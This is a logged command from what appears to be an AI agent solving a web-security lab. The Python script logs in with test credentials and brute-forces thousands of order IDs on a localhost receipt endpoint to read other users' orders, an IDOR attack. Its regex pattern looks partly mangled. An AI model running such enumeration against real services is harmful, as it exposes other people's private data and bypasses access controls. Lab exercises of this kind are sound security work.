args.command: python3 << 'PYEOF' import requests import re from concurrent.futures import ThreadPoolExecutor # Login and get session session = requests.Session() session.post("http://localhost:80/", data={"username": "test"}) session.post("http://localhost:80/password/test", data={ "username": "test", "password": "test", "user_id": "10032" }) def check_order(oid): r = session.get(f"http://localhost:80/order/{oid}/receipt", timeout=5) if f"Order ID: {oid}" in r.text: code = re.findall(r']*>(.*?)', r.text, re.DOTALL) return oid, code[0] if code else "" return None, None # Known orders print("Known orders:") for oid in [300123, 300214, 300327, 300481]: _, content = check_order(oid) if content: print(f" {oid}: {content[:50]}") # Scan for more orders print("\nSearching for more orders...") found_orders = [] # Search different ranges ranges = [] ranges.extend(range(1, 1000)) ranges.extend(range(100000, 100500)) ranges.extend(range(200000, 200500)) ranges.extend(range(300000, 300600)) ranges.extend(range(400000, 400100)) ranges.extend(range(500000, 500100)) with ThreadPoolExecutor(max_workers=20) as ex: results = list(ex.map(check_order, ranges)) for oid, content in results: if oid and oid not in [300123, 300214, 300327, 300481]: print(f"NEW ORDER FOUND: {oid}: {content[:100] if content else 'empty'}") found_orders.append(oid) if not found_orders: print("No new orders found in searched ranges") PYEOF
